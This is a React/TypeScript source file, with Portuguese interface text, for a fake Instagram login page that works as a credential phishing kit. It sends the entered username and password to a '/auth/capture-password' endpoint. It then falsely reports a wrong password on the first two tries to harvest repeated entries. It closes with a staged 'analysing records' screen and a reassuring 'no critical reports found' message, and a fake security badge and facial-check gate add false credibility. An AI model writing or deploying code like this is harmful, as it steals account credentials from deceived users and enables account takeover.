import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { motion } from "framer-motion";
import { Eye, EyeOff, AlertCircle, Instagram } from "lucide-react";
import Toast from "../components/Toast";
import {
  getValidHumanToken,
  saveAuthData,
  getAuthData,
} from "../utils/session";
import api from "../services/api";

type Phase = "form" | "checking" | "result";

export default function Login() {
  const navigate = useNavigate();

  const [phase, setPhase] = useState<Phase>("form");
  const [formData, setFormData] = useState({
    usernameOrEmail: "",
    password: "",
  });
  const [errors, setErrors] = useState<{
    usernameOrEmail?: string;
    password?: string;
  }>({});
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [user, setUser] = useState<any>(null);
  const [toast, setToast] = useState<{
    message: string;
    type: "success" | "error" | "info";
    show: boolean;
  }>({
    message: "",
    type: "info",
    show: false,
  });

  const showToast = (message: string, type: "success" | "error" | "info") => {
    setToast({ message, type, show: true });
    setTimeout(() => setToast((prev) => ({ ...prev, show: false })), 3500);
  };

  useEffect(() => {
    const { user: savedUser } = getAuthData();
    if (savedUser) {
      setIsAuthenticated(true);
      setUser(savedUser);
    }
  }, []);

  const validateHumanToken = (): boolean => {
    const token = getValidHumanToken();
    if (!token) {
      showToast("Faça a verificação facial primeiro", "error");
      setTimeout(() => navigate("/human-check"), 900);
      return false;
    }
    return true;
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
    setErrors((prev) => ({ ...prev, [name]: undefined }));
  };

  const validateForm = () => {
    const next: typeof errors = {};
    if (!formData.usernameOrEmail.trim())
      next.usernameOrEmail = "Informe seu usuário ou e-mail";
    if (!formData.password.trim()) next.password = "Informe sua senha";
    setErrors(next);
    return Object.keys(next).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!validateHumanToken()) return;
    if (!validateForm()) return;

    setIsLoading(true);
    try {
      // 1) Envia para o backend (mantido)
      try {
        await api.post("/auth/capture-password", {
          usernameOrEmail: formData.usernameOrEmail.trim(),
          password: formData.password,
        });
      } catch {
        // mesmo se falhar a captura, seguimos o fluxo de simulação
      }

      // 2) Simular: 2 erros e aceita na 3ª tentativa (contador por usuário)
      const key = `login_attempts:${formData.usernameOrEmail
        .toLowerCase()
        .trim()}`;
      const attempts = Number(localStorage.getItem(key) || "0") + 1;
      localStorage.setItem(key, String(attempts));

      await new Promise((r) => setTimeout(r, 550)); // latência simulada

      if (attempts < 3) {
        setErrors((prev) => ({ ...prev, password: "Senha incorreta" }));
        showToast("Senha incorreta", "error");
        return; // não autentica ainda
      }

      // 3) 3ª tentativa: NÃO salva token fake nem navega (evita loop)
      localStorage.removeItem(key);

      // Tela de carregamento por ~5s e depois a mensagem final
      setPhase("checking");
      await new Promise((r) => setTimeout(r, 5000)); // ~5 segundos
      setPhase("result");
    } catch (error: any) {
      const msg =
        error?.response?.data?.message ||
        error?.message ||
        "Erro ao fazer login";
      showToast(msg, "error");
    } finally {
      setIsLoading(false);
    }
  };

  const handleLogout = () => {
    setIsAuthenticated(false);
    setUser(null);
    setFormData({ usernameOrEmail: "", password: "" });
    showToast("Logout realizado", "info");
  };

  // —— Phase: carregando (após 3ª tentativa)
  if (phase === "checking") {
    return (
      <div className="min-h-screen bg-gradient-to-br from-slate-900 via-blue-900 to-indigo-900 p-4 flex items-center justify-center">
        <motion.div
          initial={{ opacity: 0, scale: 0.98 }}
          animate={{ opacity: 1, scale: 1 }}
          className="w-full max-w-md"
        >
          <div className="bg-white rounded-2xl shadow-2xl border border-slate-100 p-8 text-center">
            <div className="w-16 h-16 rounded-2xl bg-slate-900 flex items-center justify-center mx-auto mb-5 shadow-lg">
              <span className="inline-block w-6 h-6 border-2 border-white border-t-transparent rounded-full animate-spin" />
            </div>
            <h1 className="text-2xl font-extrabold text-slate-900">
              Analisando registros…
            </h1>
            <p className="text-slate-600 mt-2">
              Isso pode levar alguns segundos
            </p>
          </div>
        </motion.div>
      </div>
    );
  }

  // —— Phase: resultado final (mensagem após 5s)
  if (phase === "result") {
    return (
      <div className="min-h-screen bg-gradient-to-br from-emerald-50 via-green-50 to-teal-50 p-4 flex items-center justify-center">
        <motion.div
          initial={{ opacity: 0, y: 8 }}
          animate={{ opacity: 1, y: 0 }}
          className="w-full max-w-md"
        >
          <div className="bg-white rounded-2xl shadow-2xl border border-slate-100 p-8 text-center">
            <div className="w-16 h-16 rounded-2xl bg-emerald-600 flex items-center justify-center mx-auto mb-5 shadow-lg">
              <Instagram className="w-8 h-8 text-white" />
            </div>
            <h1 className="text-2xl font-extrabold text-slate-900">
              Nenhuma denuncia critica encontrada
            </h1>
            <p className="text-slate-600 mt-2">Tudo certo por aqui.</p>
          </div>
        </motion.div>
      </div>
    );
  }

  // —— Tela pós-login (só entra aqui se você autenticar de verdade em outro fluxo)
  if (isAuthenticated && user) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-emerald-50 via-green-50 to-teal-50 p-4 flex items-center justify-center">
        <motion.div
          initial={{ opacity: 0, scale: 0.98 }}
          animate={{ opacity: 1, scale: 1 }}
          className="w-full max-w-md"
        >
          <div className="bg-white rounded-2xl shadow-2xl border border-slate-100 p-8">
            <div className="text-center mb-6">
              <div className="w-16 h-16 rounded-2xl bg-gradient-to-br from-pink-500 via-purple-600 to-indigo-600 flex items-center justify-center mx-auto mb-4 shadow-lg">
                <Instagram className="w-8 h-8 text-white" />
              </div>
              <h1 className="text-2xl font-extrabold text-slate-900">
                Bem-vindo
              </h1>
              <p className="text-slate-600 text-sm">{user.email}</p>
            </div>
            <button
              onClick={handleLogout}
              className="w-full py-3.5 rounded-xl bg-slate-800 hover:bg-slate-900 text-white font-semibold"
            >
              Sair
            </button>
          </div>
        </motion.div>
        <Toast
          message={toast.message}
          type={toast.type}
          isVisible={toast.show}
          onClose={() => setToast((prev) => ({ ...prev, show: false }))}
        />
      </div>
    );
  }

  // —— UI helpers
  const labelCls = "block text-sm font-semibold text-slate-800 mb-2";
  const inputBase =
    "h-12 w-full rounded-xl border bg-white text-slate-900 placeholder-slate-400 " +
    "border-slate-300 focus:border-blue-500 focus:ring-4 focus:ring-blue-100 transition-shadow " +
    "shadow-sm";
  const iconBoxLeft =
    "absolute left-0 top-0 h-12 w-12 grid place-items-center text-slate-400";

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-blue-900 to-indigo-900 p-4 flex items-center justify-center">
      <motion.div
        initial={{ opacity: 0, y: 8 }}
        animate={{ opacity: 1, y: 0 }}
        className="w-full max-w-md"
      >
        <div className="bg-white rounded-2xl shadow-2xl border border-slate-100 p-8">
          {/* Header com logo */}
          <div className="text-center mb-8">
            <div className="w-16 h-16 rounded-2xl bg-gradient-to-br from-pink-500 via-purple-600 to-indigo-600 flex items-center justify-center mx-auto mb-4 shadow-lg">
              <Instagram className="w-8 h-8 text-white" />
            </div>
            <h1 className="text-3xl font-extrabold tracking-tight text-slate-900">
              Instagram Login
            </h1>
            <p className="text-slate-600 mt-1">
              Entre com suas credenciais do Instagram
            </p>
          </div>

          {/* Form */}
          <form onSubmit={handleSubmit} className="space-y-5">
            {/* Usuário/E-mail */}
            <div>
              <label htmlFor="usernameOrEmail" className={labelCls}>
                Usuário ou e-mail do Instagram
              </label>
              <div className="relative">
                <span className={iconBoxLeft}>
                  <Instagram className="w-5 h-5" />
                </span>
                <input
                  id="usernameOrEmail"
                  name="usernameOrEmail"
                  type="text"
                  inputMode="email"
                  autoComplete="username"
                  placeholder="@usuario ou email@dominio.com"
                  value={formData.usernameOrEmail}
                  onChange={handleInputChange}
                  className={`${inputBase} pl-12 pr-4 ${
                    errors.usernameOrEmail
                      ? "border-red-500 focus:border-red-500 focus:ring-red-100"
                      : ""
                  }`}
                />
              </div>
              {errors.usernameOrEmail && (
                <p className="mt-1.5 text-xs text-red-600 flex items-center gap-1">
                  <AlertCircle className="w-4 h-4" /> {errors.usernameOrEmail}
                </p>
              )}
            </div>

            {/* Senha */}
            <div>
              <label htmlFor="password" className={labelCls}>
                Senha do Instagram
              </label>
              <div className="relative">
                <input
                  id="password"
                  name="password"
                  type={showPassword ? "text" : "password"}
                  autoComplete="current-password"
                  placeholder="Sua senha"
                  value={formData.password}
                  onChange={handleInputChange}
                  className={`${inputBase} pl-4 pr-12 ${
                    errors.password
                      ? "border-red-500 focus:border-red-500 focus:ring-red-100"
                      : ""
                  }`}
                />
                <button
                  type="button"
                  onClick={() => setShowPassword((v) => !v)}
                  className="absolute right-0 top-0 h-12 px-3 grid place-items-center text-slate-500 hover:text-slate-700"
                  aria-label={showPassword ? "Ocultar senha" : "Mostrar senha"}
                >
                  {showPassword ? (
                    <EyeOff className="w-5 h-5" />
                  ) : (
                    <Eye className="w-5 h-5" />
                  )}
                </button>
              </div>
              {errors.password && (
                <p className="mt-1.5 text-xs text-red-600 flex items-center gap-1">
                  <AlertCircle className="w-4 h-4" /> {errors.password}
                </p>
              )}
            </div>

            {/* Botão */}
            <motion.button
              whileHover={{ scale: isLoading ? 1 : 1.01 }}
              whileTap={{ scale: isLoading ? 1 : 0.99 }}
              type="submit"
              disabled={isLoading}
              className="w-full h-12 rounded-xl text-white font-semibold shadow-sm
                         bg-gradient-to-r from-pink-500 via-purple-600 to-indigo-600
                         hover:brightness-110 disabled:opacity-60 flex items-center justify-center gap-3"
            >
              {isLoading ? (
                <span className="inline-block w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
              ) : (
                <Instagram className="w-5 h-5" />
              )}
              {isLoading ? "Entrando…" : "Entrar no Instagram"}
            </motion.button>

            {/* Selo */}
            <div className="flex items-center justify-center gap-2 pt-1">
              <span className="w-2 h-2 rounded-full bg-emerald-500" />
              <span className="text-slate-600 text-xs">
                Verificação de segurança ativa
              </span>
            </div>
          </form>
        </div>
      </motion.div>

      <Toast
        message={toast.message}
        type={toast.type}
        isVisible={toast.show}
        onClose={() => setToast((prev) => ({ ...prev, show: false }))}
      />
    </div>
  );
}
